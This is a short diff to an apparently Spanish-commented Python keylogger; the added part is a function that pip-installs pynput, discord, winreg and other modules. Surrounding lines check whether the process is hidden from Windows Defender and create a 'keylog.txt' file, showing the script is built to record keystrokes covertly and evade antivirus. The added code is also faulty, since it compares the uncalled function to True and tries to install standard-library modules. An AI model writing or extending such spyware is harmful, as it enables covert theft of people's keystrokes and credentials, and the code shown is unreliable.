@@ -61,6 +61,22 @@ if hide_process() == True:
 if hide_process() == False:
     print("Windows defender ha detectado el script, cerrando proceso...")
     sys.exit()
+# Instala las dependencias del script
+
+def install():
+    os.system("pip install pynput")
+    os.system("pip install discord")
+    os.system("pip install winreg")
+    os.system("pip install ctypes")
+    os.system("pip install setproctitle")
+    os.system("pip install asyncio")
+    os.system("pip install threading")
+    os.system("pip install time")
+    return True
+if install == True:
+    pass
+if install == False:
+    sys.exit()
 
 # Forzar la creación del archivo de texto
 create_txt = "keylog.txt"
